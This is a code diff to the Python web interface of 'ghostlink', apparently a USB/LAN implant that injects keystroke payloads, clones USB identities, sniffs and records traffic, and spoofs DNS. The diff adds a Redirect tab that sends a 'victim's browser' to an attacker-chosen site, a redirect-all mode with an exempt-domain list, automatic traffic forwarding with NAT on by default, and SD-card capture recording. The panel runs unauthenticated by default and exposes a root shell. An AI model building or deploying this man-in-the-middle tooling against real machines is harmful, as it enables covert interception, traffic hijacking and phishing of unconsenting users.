@@ -17,6 +17,7 @@ separate :8080 forwarder.
 
 import fcntl
 import http.server
+import ipaddress
 import json
 import os
 import pty
@@ -24,7 +25,10 @@ import re
 import secrets
 import select
 import signal
+import socket
 import socketserver
+import ssl
+import stat
 import struct
 import subprocess
 import sys
@@ -32,7 +36,20 @@ import termios
 import threading
 import time
 from pathlib import Path
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, urljoin
+
+# dnsq.py sits next to this file. Put that folder on the path so the import also
+# works when webui.py is loaded by path (the tests do that).
+_HERE = str(Path(__file__).resolve().parent)
+if _HERE not in sys.path:
+    sys.path.insert(0, _HERE)
+import dnsq
+
+# Try to import certs, but don't fail if it's not available
+try:
+    from certs import CAManager
+except ImportError:
+    CAManager = None
 
 ROOT       = Path(os.environ.get("GL_ROOT", "/root/ghostlink"))
 CFG_PATH   = ROOT / "config.txt"
@@ -50,6 +67,31 @@ _HONEY_RATE = {}  # ip -> [timestamps] for honeypot submit rate limit
 _CFG_LOCK   = threading.Lock()  # serialize /api/config read-modify-write
 _TL_LOCK    = threading.Lock()
 LOG_PATH   = ROOT / "logs" / "ghostlink.log"
+# Written by forwarder.py: "running: ..." or "stopped: <why>". Shown in the UI.
+FORWARDER_STATUS = Path("/run/ghostlink-forwarder.status")
+FORWARDER_PID    = Path("/run/ghostlink-forwarder.pid")     # forwarder.py claims this while it runs
+
+
+def _start_forwarder():
+    """Start forwarder.py for eth0 <-> usb0 with its output going to the log.
+    Returns None if it is still running a second later, else why it stopped."""
+    try:
+        with open(LOG_PATH, "ab") as logf:
+            p = subprocess.Popen(
+                ["python3", str(ROOT / "forwarder.py"), "eth0", "usb0"],
+                stdin=subprocess.DEVNULL, stdout=logf, stderr=subprocess.STDOUT,
+                start_new_session=True)
+    except Exception as e:
+        return f"could not start forwarder.py: {e}"
+    time.sleep(1.0)
+    if p.poll() is None:
+        return None
+    try:
+        return FORWARDER_STATUS.read_text().strip() or f"exited with code {p.returncode}"
+    except Exception:
+        return f"exited with code {p.returncode}"
+
+
 STATS_PATH = Path("/tmp/ghostlink.stats.json")
 LEASE_PATH = Path("/tmp/dnsmasq.leases")
 
@@ -119,17 +161,20 @@ def _session_drop(tok: str):
         SESSIONS.pop(tok, None)
 
 
-def _login_throttled(ip: str) -> bool:
+def _login_allowed(ip: str) -> bool:
+    """Count this login attempt and say whether it is within the limit. The check and the
+    record share one lock, so parallel requests cannot all pass before any of them is counted."""
     now = time.time()
     with SESSION_LOCK:
+        # forget IPs whose attempts have all aged out, so the table stays small
+        for k in [k for k, v in LOGIN_ATTEMPTS.items() if now - v[-1] >= 60]:
+            del LOGIN_ATTEMPTS[k]
         hist = [t for t in LOGIN_ATTEMPTS.get(ip, []) if now - t < 60]
+        if len(hist) >= LOGIN_MAX:
+            return False
+        hist.append(now)
         LOGIN_ATTEMPTS[ip] = hist
-        return len(hist) >= LOGIN_MAX
-
-
-def _login_record(ip: str):
-    with SESSION_LOCK:
-        LOGIN_ATTEMPTS.setdefault(ip, []).append(time.time())
+        return True
 
 # Script-library filename rule: ascii word-chars, dash, dot, underscore.
 # No slashes, no ..  Length 1..64. One of a few allowed extensions.
@@ -143,6 +188,9 @@ SCRIPT_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,63}\.(ducky|txt|sh|dd
 
 PTY_SHELLS = {}  # {token: {"pid":..., "fd":..., "lock":Lock, "lastread":ts, "buf":str}}
 PTY_LOCK   = threading.Lock()
+# Bytes of shell output kept while a command runs. The reply shows only the last 64 KB, so
+# anything older is dropped rather than held in memory.
+PTY_WINDOW = 256 * 1024
 
 def _pty_strip_ansi(s: str) -> str:
     # Drop ANSI CSI / OSC and lonely CR for cleaner web output.
@@ -151,28 +199,78 @@ def _pty_strip_ansi(s: str) -> str:
     return s.replace("\r\n", "\n").replace("\r", "")
 
 
+def _pty_exited(pid: int) -> bool:
+    """True once the shell has exited. waitpid also reaps it: kill(pid, 0) still succeeds on a
+    zombie, so it cannot tell a dead shell from a live one."""
+    try:
+        done, _ = os.waitpid(pid, os.WNOHANG)
+    except ChildProcessError:
+        return True
+    return done == pid
+
+
+def _pty_reap(pid: int):
+    """Reap a shell after its pty was closed. An interactive sh can ignore SIGTERM, so it gets
+    SIGKILL if it has not exited within 2 s."""
+    try:
+        for _ in range(20):
+            done, _ = os.waitpid(pid, os.WNOHANG)
+            if done: return
+            time.sleep(0.1)
+        os.kill(pid, signal.SIGKILL)
+        os.waitpid(pid, 0)
+    except (ChildProcessError, OSError):
+        pass
+
+
+def _pty_resync(fd: int, wait: float = 5.0) -> bool:
+    """Interrupt whatever is still running in the shell, then wait for a fresh sentinel, so the
+    next command starts at a clean prompt. False if the shell never answered."""
+    marker = "__GL_SYNC_" + secrets.token_hex(6) + "__"
+    end_re = re.compile(re.escape(marker.encode()) + rb" rc=\d+\r?\n")
+    buf = b""
+    try:
+        os.write(fd, b"\x03")
+        time.sleep(0.2)              # let the interrupt land before the probe is typed
+        os.write(fd, f"printf '\\n{marker} rc=%d\\n' $?\n".encode())
+        end = time.time() + wait
+        while time.time() < end:
+            if not select.select([fd], [], [], 0.1)[0]:
+                continue
+            chunk = os.read(fd, 8192)
+            if not chunk:
+                return False
+            buf = (buf + chunk)[-PTY_WINDOW:]
+            if end_re.search(buf):
+                return True
+    except OSError:
+        pass
+    return False
+
+
 def pty_open(token: str) -> dict:
     """Open a persistent sh session for this token (or return existing)."""
     with PTY_LOCK:
         s = PTY_SHELLS.get(token)
-        if s and s.get("pid"):
-            # verify alive
-            try: os.kill(s["pid"], 0)
-            except OSError:
-                try: os.close(s["fd"])
-                except Exception: pass
-                PTY_SHELLS.pop(token, None)
-                s = None
+        if s and s.get("pid") and _pty_exited(s["pid"]):
+            # the shell exited (exit, Ctrl-D): close its fd and start a fresh one
+            try: os.close(s["fd"])
+            except Exception: pass
+            PTY_SHELLS.pop(token, None)
+            s = None
         if not s:
             pid, fd = pty.fork()
             if pid == 0:
-                os.chdir("/root")
-                os.environ["PS1"] = "$ "
-                os.environ["TERM"] = "dumb"
+                # The child must never run on into the parent's code: any failure here ends it.
                 try:
+                    try: os.chdir("/root")
+                    except OSError: pass
+                    os.environ["PS1"] = "$ "
+                    os.environ["TERM"] = "dumb"
                     os.execvp("sh", ["sh"])
-                except Exception:
-                    os._exit(1)
+                except BaseException:
+                    pass
+                os._exit(1)
             # set winsize so programs that query TIOCGWINSZ don't trip
             try:
                 fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", 40, 120, 0, 0))
@@ -200,6 +298,7 @@ def pty_close(token: str):
         except Exception: pass
         try: os.close(s["fd"])
         except Exception: pass
+        threading.Thread(target=_pty_reap, args=(s["pid"],), daemon=True).start()
 
 
 def pty_run(token: str, cmd: str, timeout: float = 15.0) -> dict:
@@ -207,9 +306,11 @@ def pty_run(token: str, cmd: str, timeout: float = 15.0) -> dict:
     s = pty_open(token)
     fd = s["fd"]
     with s["lock"]:
-        # drain anything stale first (prior async output / lingering prompt)
+        # drain anything stale first (prior async output / lingering prompt). Bounded: a command
+        # still running from an earlier call can keep the pty busy indefinitely.
+        drain_end = time.time() + 2.0
         try:
-            while True:
+            while time.time() < drain_end:
                 r, _, _ = select.select([fd], [], [], 0)
                 if not r: break
                 os.read(fd, 4096)
@@ -231,6 +332,7 @@ def pty_run(token: str, cmd: str, timeout: float = 15.0) -> dict:
         rc_val = None
         done = False
         start = time.time()
+        end_re = re.compile(re.escape(marker.encode()) + rb" rc=(\d+)\r?\n")
         while time.time() - start < timeout and not done:
             r, _, _ = select.select([fd], [], [], 0.1)
             if r:
@@ -239,22 +341,22 @@ def pty_run(token: str, cmd: str, timeout: float = 15.0) -> dict:
                     if not chunk:
                         done = True; break
                     buf += chunk
-                    # Normalize line endings for the match (pty converts \n to
-                    # \r\n on echo — the previous regex failed because of this).
-                    text_so_far = buf.decode("utf-8", "replace").replace("\r\n", "\n").replace("\r", "")
-                    m = re.search(re.escape(marker) + r" rc=(\d+)\n", text_so_far)
+                    # Keep only the tail: the reply shows the last 64 KB anyway, and a runaway
+                    # command (yes) would otherwise grow this buffer without limit.
+                    if len(buf) > PTY_WINDOW:
+                        buf = buf[-PTY_WINDOW:]
+                    # The sentinel is printed at the end, so search only where new bytes arrived.
+                    # The pty sends \r\n for a newline, hence \r?\n.
+                    m = end_re.search(buf, max(0, len(buf) - len(chunk) - 256))
                     if m:
-                        # Second occurrence is the printed one (the first is
-                        # the echoed probe line) — but the regex is non-greedy,
-                        # so it finds the first. We want the LAST match.
-                        for m2 in re.finditer(re.escape(marker) + r" rc=(\d+)\n", text_so_far):
-                            m = m2
                         rc_val = int(m.group(1))
-                        buf = text_so_far[:m.start()].encode("utf-8", "replace")
+                        buf = buf[:m.start()]
                         done = True
                 except OSError:
                     done = True; break
 
+        if not done and not _pty_resync(fd):
+            pty_close(token)   # the shell did not answer the interrupt; the next call starts a new one
         text = buf.decode("utf-8", "replace").replace("\r\n", "\n").replace("\r", "")
         text = _pty_strip_ansi(text)
         # Drop the echoed probe line itself (contains the marker name).
@@ -286,6 +388,7 @@ ENABLE_HID=TRUE
 SNIFF_IFACE=usb0
 LOG=TRUE
 RECORD_PCAP=TRUE
+RECORD_SD=TRUE
 RECORD_ROTATE_KB=1024
 RECORD_RING_FILES=4
 VERDICT_STREAM=TRUE
@@ -305,6 +408,9 @@ REDIRECT=FALSE
 REDIRECT_FROM=
 REDIRECT_TO=http://example.com
 REDIRECT_PRESERVE_PATH=TRUE
+REDIRECT_ALL=FALSE
+REDIRECT_ALL_TO=
+REDIRECT_EXEMPT=anthropic.com,claude.ai,claude.com,claudeusercontent.com,msftconnecttest.com,msftncsi.com,windowsupdate.com
 DNS_SPOOF=FALSE
 DNS_SPOOF_HOSTS=
 HID_LAYOUT=us
@@ -318,7 +424,8 @@ BUTTON_DOUBLE_TAP_PAYLOAD=
 BUTTON_HOLD_PAYLOAD=
 BUTTON_TAP_WINDOW_MS=600
 BUTTON_HOLD_MS=1200
-NET_MODE=PASSIVE
+NET_MODE=NAT
+AUTO_FORWARD=TRUE
 LIVESAVE=TRUE
 WEBUI_REQUIRE_AUTH=FALSE
 HONEYPOT=FALSE
@@ -328,10 +435,43 @@ HONEYPOT_RULES=
 """
 
 
+# Loot line count, cached by the file's mtime and size: the status poll runs every 5 s.
+_LOOT_COUNT = {"key": None, "n": 0}
+
+
+def _atomic_write(path: Path, data):
+    """Write data through a temp file that is unique to this call, then rename it over path.
+    Two saves at once (two tabs, a double submit) therefore never share one temp file."""
+    if isinstance(data, str): data = data.encode("utf-8")
+    tmp = path.with_name(f"{path.name}.{os.getpid()}.{threading.get_ident()}.new")
+    try:
+        tmp.write_bytes(data)
+        os.replace(tmp, path)
+    except BaseException:
+        try: tmp.unlink()
+        except OSError: pass
+        raise
+
+
+# identity.env is sourced by the boot script. One line it cannot parse stops the USB gadget from
+# starting, so an identity from a bundle is accepted only when every line is a plain USB_* setting.
+_IDENTITY_LINE_RE = re.compile(r'^USB_(VID|PID|MFR|PROD|SER)="[^"\\`$\r\n]*"$')
+
+
+def _identity_ok(data: bytes) -> bool:
+    try: text = data.decode("utf-8")
+    except UnicodeDecodeError: return False
+    for ln in text.splitlines():
+        s = ln.strip()
+        if not s or s.startswith("#"): continue
+        if not _IDENTITY_LINE_RE.match(s): return False
+    return True
+
+
 def load_cfg():
     cfg = {}
     if not CFG_PATH.exists(): return cfg
-    for ln in CFG_PATH.read_text().splitlines():
+    for ln in CFG_PATH.read_text(encoding="utf-8", errors="replace").splitlines():
         s = ln.strip()
         if not s or s.startswith("#") or "=" not in s: continue
         k, v = s.split("=", 1)
@@ -362,6 +502,7 @@ HTML = r"""<!doctype html>
     <button class="tablinks"        data-tab="Records">Records</button>
     <button class="tablinks"        data-tab="Query">Query</button>
     <button class="tablinks"        data-tab="Config">Config</button>
+    <button class="tablinks"        data-tab="Redirect">Redirect</button>
     <button class="tablinks"        data-tab="Scripting">Scripting</button>
     <button class="tablinks"        data-tab="LiveType">Live Type</button>
     <button class="tablinks"        data-tab="Clone">Clone</button>
@@ -407,6 +548,10 @@ HTML = r"""<!doctype html>
         Passive = sniff only what the host sends via usb0.
         Forwarded = cross-copy frames between eth0 and usb0 (needs a cable).
       </div>
+      <label class="dim" style="font-size:12px; display:block; margin-top:10px; cursor:pointer;">
+        <input type="checkbox" id="autoFwd" onchange="setAutoForward(this.checked)">
+        Forward automatically when a LAN cable is plugged in (on by default)
+      </label>
     </div>
 
     <div class="stat-grid">
@@ -415,6 +560,7 @@ HTML = r"""<!doctype html>
       <div class="stat"><label>frames total</label>  <div class="val" id="s-frames">0</div></div>
       <div class="stat"><label>matches total</label> <div class="val match" id="s-matches">0</div></div>
       <div class="stat"><label>disk free</label>     <div class="val" id="s-disk">-</div></div>
+      <div class="stat"><label>SD card</label>       <div class="val" id="s-sd">-</div></div>
       <div class="stat"><label>uptime</label>        <div class="val" id="s-uptime">-</div></div>
     </div>
 
@@ -556,6 +702,9 @@ HTML = r"""<!doctype html>
           <div class="cfg-row sw-row"><label>Record PCAP</label>
             <label class="sw"><input type="checkbox" data-k="RECORD_PCAP"><span class="slider"></span></label>
           </div>
+          <div class="cfg-row sw-row"><label>Record to SD card</label>
+            <label class="sw"><input type="checkbox" data-k="RECORD_SD"><span class="slider"></span></label>
+          </div>
           <div class="cfg-row sw-row"><label>Verdict stream</label>
             <label class="sw"><input type="checkbox" data-k="VERDICT_STREAM"><span class="slider"></span></label>
           </div>
@@ -595,28 +744,6 @@ HTML = r"""<!doctype html>
         </div>
       </div>
 
-      <div class="section">
-        <h4>Redirect</h4>
-        <div class="cfg-grid">
-          <div class="cfg-row sw-row"><label>Redirect on</label>
-            <label class="sw"><input type="checkbox" data-k="REDIRECT"><span class="slider"></span></label>
-          </div>
-          <div class="cfg-row sw-row"><label>Preserve path</label>
-            <label class="sw"><input type="checkbox" data-k="REDIRECT_PRESERVE_PATH"><span class="slider"></span></label>
-          </div>
-          <div class="cfg-row"><label>REDIRECT_FROM (csv)</label><input data-k="REDIRECT_FROM"></div>
-          <div class="cfg-row"><label>REDIRECT_TO (URL/host)</label><input data-k="REDIRECT_TO"></div>
-          <div class="cfg-row sw-row"><label>DNS spoof file on</label>
-            <label class="sw"><input type="checkbox" data-k="DNS_SPOOF"><span class="slider"></span></label>
-          </div>
-          <div class="cfg-row"><label>DNS spoof file path</label><input data-k="DNS_SPOOF_HOSTS"></div>
-        </div>
-        <div class="setting-row flex-row" style="gap:10px; flex-wrap:wrap; margin-top:12px; padding-top:12px; border-top:1px solid var(--glass-border);">
-          <input type="text" id="spoof-host" placeholder="quick-add host (newhost.com)" class="flex-grow">
-          <input type="text" id="spoof-to" placeholder="override REDIRECT_TO (optional)" style="min-width:220px;">
-          <button onclick="addSpoof()">+ Append &amp; Save</button>
-        </div>
-      </div>
     </div>
 
     <!-- raw / advanced view ------------------------------------------- -->
@@ -632,6 +759,78 @@ HTML = r"""<!doctype html>
   </section>
 
   <!-- (HID tab removed — use Scripting pane instead for payload fire) -->
+
+  <!-- =========== REDIRECT (own tab) =========== -->
+  <section id="tab-Redirect" class="tabcontent">
+    <div class="section">
+      <h4>Status</h4>
+      <div id="redir-status" class="cfg-help" style="font-size:13px; line-height:1.6;">loading…</div>
+    </div>
+      <div class="section">
+        <h4>Hostnames seen in traffic</h4>
+        <p class="dim" style="font-size:12px;">Shown while traffic passes through the device (LAN cable in, forwarding on). Names that are subdomains of a listed site are added automatically; the others wait for you to click Add.</p>
+        <div id="redir-seen" style="font-size:13px; line-height:1.9;"></div>
+      </div>
+      <div class="section">
+        <h4>Check where redirects land</h4>
+        <p class="dim" style="font-size:12px;">Visits the redirect target and the listed sites 3 times each over the uplink (needs the LAN cable) and follows redirects to the final address.</p>
+        <button class="btn-ghost" onclick="redirectCheck()">Check now</button>
+        <div id="redir-checks" style="font-size:13px; line-height:1.6; margin-top:8px;"></div>
+      </div>
+      <div class="section">
+        <h4>Redirect</h4>
+        <div class="cfg-grid">
+          <div class="cfg-row sw-row"><label>Redirect on</label>
+            <label class="sw"><input type="checkbox" data-k="REDIRECT"><span class="slider"></span></label>
+          </div>
+          <div class="cfg-row sw-row"><label>Preserve path</label>
+            <label class="sw"><input type="checkbox" data-k="REDIRECT_PRESERVE_PATH"><span class="slider"></span></label>
+          </div>
+          <div class="cfg-row cfg-row-wide">
+            <label>Redirect from (hosts)</label>
+            <input data-k="REDIRECT_FROM" placeholder="google.com, bing.com">
+            <div class="cfg-help">Comma-separated hosts (e.g., google.com, facebook.com). When a victim's browser requests one of these, they get 302'd to the target below.</div>
+          </div>
+          <div class="cfg-row cfg-row-wide">
+            <label>Redirect to (URL)</label>
+            <input data-k="REDIRECT_TO" placeholder="https://example.com or example.com">
+            <div class="cfg-help">Full URL (http:// or https://) or just the host. Must be set, or redirect is disabled.</div>
+          </div>
+          <div id="raBanner" class="cfg-row cfg-row-wide" style="display:none;">
+            <div class="cfg-help" style="color:#e5484d;font-weight:600;">Redirect all URLs is ON: every site this PC opens goes to <span id="raBannerTo"></span>, except the exempt domains.</div>
+          </div>
+          <div class="cfg-row sw-row"><label>Redirect all URLs</label>
+            <label class="sw"><input type="checkbox" data-k="REDIRECT_ALL"><span class="slider"></span></label>
+          </div>
+          <div class="cfg-row cfg-row-wide">
+            <label>Redirect all to (URL)</label>
+            <input data-k="REDIRECT_ALL_TO" placeholder="https://example.com">
+            <div class="cfg-help">Target for every site when "Redirect all URLs" is on. Must be a full http:// or https:// URL.</div>
+          </div>
+          <div class="cfg-row cfg-row-wide">
+            <label>Exempt domains</label>
+            <input data-k="REDIRECT_EXEMPT" placeholder="anthropic.com, claude.ai, ...">
+            <div class="cfg-help">Comma-separated domains that keep working (suffix match, so subdomains too). The target is always exempt.</div>
+          </div>
+          <div class="cfg-row cfg-row-wide">
+            <div class="cfg-help" style="color:var(--warn,#c99a06);">Turns this PC's DNS through the WebBee. Exempt domains (including the chat) keep working. HTTPS sites will show a certificate warning.</div>
+          </div>
+          <div class="cfg-row sw-row"><label>DNS spoof file on</label>
+            <label class="sw"><input type="checkbox" data-k="DNS_SPOOF"><span class="slider"></span></label>
+          </div>
+          <div class="cfg-row"><label>DNS spoof file path</label><input data-k="DNS_SPOOF_HOSTS"></div>
+        </div>
+        <div class="quick-add">
+          <input type="text" id="spoof-host" placeholder="quick-add host (newhost.com)">
+          <input type="text" id="spoof-to" placeholder="override REDIRECT_TO (optional)">
+          <button onclick="addSpoof()">+ Append &amp; Save</button>
+        </div>
+      </div>
+  <div class="section" style="display:flex; gap:12px; align-items:center;">
+    <button class="btn-save" onclick="redirectSave()">Save redirect settings</button>
+    <span class="dim" style="font-size:12px;">Saves the fields on this tab. dnsmasq reloads when a redirect or DNS setting changed.</span>
+  </div>
+  </section>
 
   <!-- =========== SCRIPTING (DuckyScript IDE) =========== -->
   <section id="tab-Scripting" class="tabcontent">
@@ -1033,6 +1232,7 @@ CSS = r""":root {
   --bg-input: #1a1a1a;
   --text-main: #ffffff;
   --text-muted: #b0b0b0;
+  --text-dim: var(--text-muted);
   --danger: #f44336;
   --danger-hover: #d32f2f;
   --glass-border: rgba(255, 255, 255, 0.1);
@@ -1651,6 +1851,40 @@ label.sw input:checked + .slider:before { transform: translateX(22px); }
 .cfg-row.sw-row label:first-child { flex: 0 0 150px; }
 .cfg-row.sw-row .sw { flex: 0 0 auto; }
 .cfg-row.sw-row .dim { font-family: inherit; }
+/* Rows with help text under the input: the input keeps its width and the help wraps under it. */
+.cfg-row.cfg-row-wide {
+  grid-column: 1 / -1;
+  display: grid;
+  grid-template-columns: 150px minmax(0, 1fr);
+  gap: 4px 10px;
+  align-items: center;
+}
+.cfg-row.cfg-row-wide > label:first-child { grid-column: 1; }
+.cfg-row.cfg-row-wide > input { grid-column: 2; width: 100%; box-sizing: border-box; }
+.cfg-row .cfg-help { grid-column: 2; font-size: 11px; color: var(--text-dim); line-height: 1.4; }
+@media (max-width: 480px) {
+  .cfg-row.cfg-row-wide { grid-template-columns: minmax(0, 1fr); }
+  .cfg-row.cfg-row-wide > label:first-child,
+  .cfg-row.cfg-row-wide > input,
+  .cfg-row .cfg-help { grid-column: 1; }
+}
+/* Quick-add row under the redirect fields: the same input look as those fields. */
+.quick-add {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 10px;
+  align-items: center;
+  margin-top: 12px;
+  padding-top: 12px;
+  border-top: 1px solid var(--glass-border);
+}
+.quick-add input[type="text"] {
+  flex: 1 1 180px;
+  min-width: 0;
+  font-family: 'Fira Code','Consolas',monospace;
+  font-size: 12px;
+  padding: 6px 10px;
+}
 
 /* ---- Terminal pane ----------------------------------------------------- */
 #termOut {
@@ -1708,6 +1942,98 @@ async function api(path, opts) {
   try { return JSON.parse(t); } catch { return t; }
 }
 
+function sdText(sd) {
+  if (!sd) return '-';
+  if (sd.mounted) return (sd.size_mb / 1024).toFixed(1) + ' GB, ' + (sd.free_mb / 1024).toFixed(1) + ' GB free';
+  if (sd.present) return 'inserted, not mounted';
+  return 'not detected';
+}
+function renderRedirect(info) {
+  const el = $('#redir-status');
+  if (!el || !info) return;
+  const h = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+  const rows = [
+    'REDIRECT: <b>' + (info.on ? 'on' : 'OFF') + '</b>',
+    'dnsmasq (DHCP + DNS): <b>' + (info.dnsmasq ? 'running' : 'NOT running') + '</b>',
+    'redirecting ' + info.hosts.length + ' host(s) to <b>' + (h(info.to) || '(not set)') + '</b>',
+  ];
+  for (const w of (info.warnings || [])) rows.push('<span style="color:#ff6b6b">⚠ ' + h(w) + '</span>');
+  el.innerHTML = rows.join('<br>');
+}
+// Save from the Redirect tab. Always the form path: the raw editor on the Config tab
+// would overwrite these fields with its stale text.
+async function redirectSave() {
+  const dirty = cfgDirty();
+  if (!Object.keys(dirty).length) { toast('nothing changed'); return; }
+  if (await cfgOverlaySet(dirty)) {
+    const w = LAST_SAVE_WARNINGS;
+    toast(w.length ? 'saved · ' + w.join(' · ') : 'saved', w.length > 0);
+  } else toast('save failed', true);
+  cfgReload();
+  refreshRedirect();
+}
+let LAST_CHECKS_RUNNING = false;
+function renderChecks(c) {
+  const el = $('#redir-checks');
+  if (!el) return;
+  const h = s => String(s).replace(/[&<>"]/g, ch => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[ch]));
+  LAST_CHECKS_RUNNING = !!(c && c.running);
+  const rows = (c && c.results) || [];
+  if (!rows.length) {
+    el.innerHTML = '<span class="dim">' + (LAST_CHECKS_RUNNING ? 'checking…' : 'No checks run yet.') + '</span>';
+    return;
+  }
+  el.innerHTML = (LAST_CHECKS_RUNNING ? '<div class="dim">checking…</div>' : '') + rows.map(r => {
+    const hops = (r.hops || []).map(x => x.status + ' ' + h(x.url)).join(' → ');
+    const result = r.error ? '<span style="color:#ff6b6b">' + h(r.error) + '</span>' : 'ends at <b>' + h(r.final) + '</b>';
+    return '<div style="margin-bottom:6px;"><code>' + h(r.from) + '</code> try ' + r.attempt + ': ' + result
+      + (hops ? '<div class="dim" style="font-size:12px;">' + hops + '</div>' : '') + '</div>';
+  }).join('');
+}
+async function redirectCheck() {
+  const r = await api('/api/redirect/check', { method: 'POST' });
+  toast(r && r.started ? 'checking…' : 'a check is already running', !(r && r.started));
+  for (let i = 0; i < 80; i++) {
+    await new Promise(res => setTimeout(res, 3000));
+    await refreshRedirect();
+    if (!LAST_CHECKS_RUNNING) break;
+  }
+}
+let LAST_REDIRECT_HOSTS = [];
+function renderSeen(seen, https) {
+  const sEl = $('#redir-seen');
+  if (!sEl) return;
+  const h = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+  const httpsNote = '<div>HTTPS (port 443): <b>' + (https ? 'on (self-signed certificate, browsers warn)' : 'OFF') + '</b></div>';
+  if (!seen.length) {
+    sEl.innerHTML = httpsNote + '<span class="dim">No names seen yet. They show up while traffic passes through the device (LAN cable in, forwarding on).</span>';
+    return;
+  }
+  sEl.innerHTML = httpsNote + seen.map(d => {
+    const inList = LAST_REDIRECT_HOSTS.includes(d.host);
+    const action = inList ? '<span class="dim">in list</span>'
+      : '<button class="btn-ghost" data-host="' + h(d.host) + '" onclick="redirectAddHost(this.dataset.host)">Add</button>';
+    return '<div style="display:flex; gap:10px; align-items:center;"><code>' + h(d.host) + '</code>'
+      + '<span class="dim">seen ' + d.count + 'x</span>' + action + '</div>';
+  }).join('');
+}
+async function redirectAddHost(host) {
+  if (LAST_REDIRECT_HOSTS.includes(host)) return;
+  const ok = await cfgOverlaySet({ REDIRECT_FROM: LAST_REDIRECT_HOSTS.concat([host]).join(',') });
+  toast(ok ? 'added ' + host : 'add failed', !ok);
+  cfgReload();
+  refreshRedirect();
+}
+async function refreshRedirect() {
+  try {
+    const st = await api('/api/status');
+    LAST_REDIRECT_HOSTS = (st.redirect_info && st.redirect_info.hosts) || [];
+    renderRedirect(st.redirect_info);
+    renderSeen(st.seen || [], st.https);
+    renderChecks(st.checks);
+  } catch (e) { $('#redir-status').textContent = 'status unavailable'; }
+}
+
 function openTab(name) {
   $$('.tabcontent').forEach(el => el.style.display = 'none');
   const el = $('#tab-' + name); if (el) el.style.display = 'block';
@@ -1718,6 +2044,7 @@ function openTab(name) {
   // Config tab: always refetch so changes made via other tabs
   // (quick-spoof, DuckyScript GL_SET, external edits) are visible
   if (name === 'Config')    { loadCfg(); }
+  if (name === 'Redirect')  { loadCfg(); refreshRedirect(); }
   if (name === 'Scripting') { scriptsRefresh(); extsRefresh(); layoutsRefresh(); }
   if (name === 'LiveType')  { $('#liveInput').focus(); }
   if (name === 'Clone')     { idRefresh(); hostsRefresh(); netProbe(); }
@@ -1745,6 +2072,7 @@ async function tick() {
     $('#s-frames').textContent  = (live.frames ?? 0).toLocaleString();
     $('#s-matches').textContent = (live.matches ?? 0).toLocaleString();
     $('#s-disk').textContent    = (live.free_mb ?? st.free_mb) + ' MB';
+    $('#s-sd').textContent      = sdText(st.sd);
     $('#s-uptime').textContent  = st.uptime || '-';
 
     // disk pressure banner
@@ -1779,6 +2107,11 @@ async function tick() {
           <td>${vdstr}</td>
         </tr>`;
       }).join('');
+    } else {
+      // No tail: say why, instead of leaving the last table in place or showing nothing.
+      vb.innerHTML = `<tr><td colspan="6" class="dim">${st.verdict
+        ? 'no frames yet'
+        : 'streaming is off, so no verdicts are written. Press "Start streaming" to resume.'}</td></tr>`;
     }
 
     const ib = $('#ifaces-body');
@@ -1884,6 +2217,9 @@ function cfgParse(txt) {
   return d;
 }
 function cfgTruthy(v) { return /^(TRUE|YES|ON|1)$/i.test(v || ''); }
+// Default exempt list, so the Redirect-all field is prefilled before the
+// device has ever written REDIRECT_EXEMPT into config.txt.
+const REDIRECT_EXEMPT_DEFAULT = 'anthropic.com,claude.ai,claude.com,claudeusercontent.com,msftconnecttest.com,msftncsi.com,windowsupdate.com';
 async function cfgReload() {
   const t = await api('/api/config');
   CFG_RAW = typeof t === 'string' ? t : '';
@@ -1895,9 +2231,31 @@ async function cfgReload() {
       // LIVESAVE defaults to ON when unset
       el.checked = (k === 'LIVESAVE' && d[k] == null) ? true : cfgTruthy(d[k]);
     } else {
-      el.value = d[k] != null ? d[k] : '';
+      el.value = d[k] != null ? d[k]
+               : (k === 'REDIRECT_EXEMPT' ? REDIRECT_EXEMPT_DEFAULT : '');
     }
+    el.dataset.loaded = cfgShown(el);   // what the form shows now; cfgDirty() compares against it
   });
+  // Show a visible warning while "redirect all" is on, so it can't be forgotten.
+  const raOn = cfgTruthy(d.REDIRECT_ALL);
+  const raBanner = $('#raBanner');
+  if (raBanner) {
+    raBanner.style.display = raOn ? '' : 'none';
+    $('#raBannerTo').textContent = d.REDIRECT_ALL_TO || '(no target set)';
+  }
+}
+// The value a form field shows: "TRUE"/"FALSE" for switches, the text otherwise.
+function cfgShown(el) {
+  return el.type === 'checkbox' ? (el.checked ? 'TRUE' : 'FALSE') : el.value;
+}
+// Fields the user changed since the last load or save, as {KEY: value}.
+function cfgDirty() {
+  const dirty = {};
+  $$('[data-k]').forEach(el => {
+    const now = cfgShown(el);
+    if (now !== el.dataset.loaded) dirty[el.dataset.k] = now;
+  });
+  return dirty;
 }
 
 /* --- live-save: when a switch flips, save immediately. The LIVESAVE
@@ -1911,50 +2269,44 @@ function bindLiveSave() {
     if (live && !live.checked && el.dataset.k !== 'LIVESAVE') return;
     // Save without doing a full form re-collect — just overlay this one key
     // (keeps mid-edit text inputs intact).
-    const re = new RegExp('^' + el.dataset.k + '=.*$', 'm');
-    let txt = CFG_RAW || '';
-    const line = el.dataset.k + '=' + (el.checked ? 'TRUE' : 'FALSE');
-    txt = re.test(txt) ? txt.replace(re, line)
-                       : (txt + (txt.endsWith('\n') ? '' : '\n') + line + '\n');
-    CFG_RAW = txt; $('#cfg').value = txt;
-    api('/api/config', { method:'POST', body: txt }).then(r => {
-      if (r && r.ok) toast(`${el.dataset.k}=${el.checked ? 'TRUE' : 'FALSE'}`);
-      else           toast('live-save failed', true);
+    const kv = { [el.dataset.k]: el.checked ? 'TRUE' : 'FALSE' };
+    // cfgOverlaySet re-reads config.txt first, so a stale CFG_RAW cannot undo other switches.
+    cfgOverlaySet(kv).then(ok => {
+      if (ok) toast(`${el.dataset.k}=${kv[el.dataset.k]}`);
+      else    toast('live-save failed', true);
     });
   });
 }
 function cfgCollect() {
-  // start from CFG_RAW (preserves comments + unknown keys), overlay form fields
-  let txt = CFG_RAW || '';
-  const overrides = {};
-  $$('[data-k]').forEach(el => {
-    const k = el.dataset.k;
